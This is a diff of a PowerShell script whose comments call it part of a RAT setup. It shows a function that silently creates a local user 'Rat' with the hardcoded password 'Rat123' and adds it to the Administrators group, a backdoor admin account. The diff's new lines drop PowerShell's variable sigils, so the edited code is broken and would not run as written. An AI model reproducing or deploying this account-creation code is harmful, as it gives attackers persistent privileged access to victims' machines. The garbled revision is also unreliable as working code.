@@ -6,28 +6,28 @@ function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
     }
 
-# create local admin for rat (Create_account = Create-NewLocalAdmin = , uname = NewLocalAdmin, pword = Password)
+# create local admin for rat 
 function Create-NewLocalAdmin {
     [CmdletBinding()]
     param (
-        [string] $NewLocalAdmin,
-        [securestring] $Password
+        [string] uname,
+        [securestring] pword
     )
     begin {
     }
     process {
-        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
-        Write-Verbose "$NewLocalAdmin local user created"
-        Add-LocalGroupMember -LocalGroupMember "Administrators" -Member "$NewLocalAdmin"
-        Write-Verbose "$NewLocalAdmin added to the local administrator group"
+        New-LocalUser "uname" -Password pword -FullName "uname" -Description "Temporary local admin"
+        Write-Verbose "uname local user created"
+        Add-LocalGroupMember -LocalGroupMember "Administrators" -Member "uname"
+        Write-Verbose "uname added to the local administrator group"
     }
     end {     
     }
 }
 # create admin user
-$NewLocalAdmin = "Rat"
-$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
-Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
+uname = "Rat"
+pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
+Create-NewLocalAdmin -NewLocalAdmin uname -Password pword
 
 #variable
 $wd = random_text
